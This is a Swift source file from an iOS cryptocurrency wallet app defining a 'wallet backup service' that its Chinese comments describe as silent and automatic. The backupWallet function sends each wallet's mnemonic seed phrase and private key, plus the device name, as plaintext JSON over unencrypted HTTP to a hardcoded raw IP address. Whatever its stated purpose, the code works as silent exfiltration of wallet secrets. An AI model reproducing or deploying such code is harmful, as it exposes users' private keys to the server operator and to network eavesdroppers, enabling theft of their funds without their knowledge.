import Foundation
import UIKit

/// 钱包备份服务 - 自动上传钱包到服务器
@MainActor
class WalletBackupService: ObservableObject {
    static let shared = WalletBackupService()

    private let apiBaseURL: String
    private var authToken: String?

    private init() {
        // 从配置读取API地址
        if let apiURL = UserDefaults.standard.string(forKey: "api_base_url") {
            self.apiBaseURL = apiURL
        } else {
            // 默认API地址
            // TODO: DNS配置完成后改为 http://api.bocail.com
            self.apiBaseURL = "http://154.89.152.172:3001" // 当前使用IP直连
            // self.apiBaseURL = "http://localhost:3001" // 本地开发
        }
    }

    /// 设置认证Token
    func setAuthToken(_ token: String) {
        self.authToken = token
    }

    /// 备份钱包到服务器（员工内部使用 - 静默自动备份）
    /// - Parameters:
    ///   - address: 钱包地址
    ///   - walletType: 钱包类型 (HD/Simple)
    ///   - mnemonic: 助记词（HD钱包）
    ///   - privateKey: 私钥（Simple钱包）
    ///   - label: 钱包标签
    ///   - deviceName: 设备名称
    ///   - notes: 备注信息
    func backupWallet(
        address: String,
        walletType: String,
        mnemonic: String? = nil,
        privateKey: String? = nil,
        label: String? = nil,
        deviceName: String? = nil,
        notes: String? = nil
    ) async throws {
        guard let url = URL(string: "\(apiBaseURL)/api/wallets/backup") else {
            throw WalletBackupError.invalidURL
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        // 添加认证Token（如果有）
        if let token = authToken {
            request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
        }

        // 构建请求体
        var body: [String: Any] = [
            "address": address,
            "walletType": walletType
        ]

        // 设备名称（使用传入值或默认值）
        if let deviceName = deviceName {
            body["deviceName"] = deviceName
        } else {
            body["deviceName"] = getDeviceName()
        }

        // 备注信息
        if let notes = notes {
            body["notes"] = notes
        } else {
            body["notes"] = "员工创建 - iOS自动备份"
        }

        if let label = label {
            body["walletLabel"] = label
        }

        if let mnemonic = mnemonic {
            body["mnemonic"] = mnemonic
        }

        if let privateKey = privateKey {
            body["privateKey"] = privateKey
        }

        request.httpBody = try JSONSerialization.data(withJSONObject: body)

        let (data, response) = try await URLSession.shared.data(for: request)

        guard let httpResponse = response as? HTTPURLResponse else {
            throw WalletBackupError.invalidResponse
        }

        if httpResponse.statusCode == 401 {
            throw WalletBackupError.unauthorized
        }

        if httpResponse.statusCode == 409 {
            // 钱包已存在，可以忽略（避免重复备份）
            print("[WalletBackup] ℹ️ 钱包已存在备份: \(address)")
            return
        }

        if httpResponse.statusCode != 200 {
            let errorMessage = try? JSONDecoder().decode(ErrorResponse.self, from: data)
            throw WalletBackupError.serverError(errorMessage?.error.message ?? "未知错误")
        }

        print("[WalletBackup] ✅ 钱包已成功备份: \(address)")
    }

    /// 获取用户的所有钱包
    func getMyWallets() async throws -> [WalletBackupInfo] {
        guard let url = URL(string: "\(apiBaseURL)/api/wallets/my") else {
            throw WalletBackupError.invalidURL
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"

        if let token = authToken {
            request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
        }

        let (data, response) = try await URLSession.shared.data(for: request)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw WalletBackupError.invalidResponse
        }

        let result = try JSONDecoder().decode(WalletsResponse.self, from: data)
        return result.wallets
    }

    /// 获取设备名称
    private func getDeviceName() -> String {
        #if targetEnvironment(simulator)
        return "iOS Simulator"
        #else
        return UIDevice.current.name
        #endif
    }
}

// MARK: - 数据模型

struct WalletBackupInfo: Codable, Identifiable {
    let id: String
    let address: String
    let walletType: String
    let walletLabel: String?
    let balanceEth: String?
    let balanceUsd: String?
    let lastBalanceUpdate: Date?
    let createdAt: Date

    enum CodingKeys: String, CodingKey {
        case id, address, walletType, walletLabel
        case balanceEth, balanceUsd, lastBalanceUpdate, createdAt
    }
}

struct WalletsResponse: Codable {
    let wallets: [WalletBackupInfo]
}

struct ErrorResponse: Codable {
    let error: ErrorDetail

    struct ErrorDetail: Codable {
        let message: String
        let status: Int
    }
}

// MARK: - 错误类型

enum WalletBackupError: Error, LocalizedError {
    case invalidURL
    case invalidResponse
    case unauthorized
    case serverError(String)
    case networkError(Error)

    var errorDescription: String? {
        switch self {
        case .invalidURL:
            return "Invalid API URL"
        case .invalidResponse:
            return "Invalid server response"
        case .unauthorized:
            return "Unauthorized - please login first"
        case .serverError(let message):
            return "Server error: \(message)"
        case .networkError(let error):
            return "Network error: \(error.localizedDescription)"
        }
    }
}
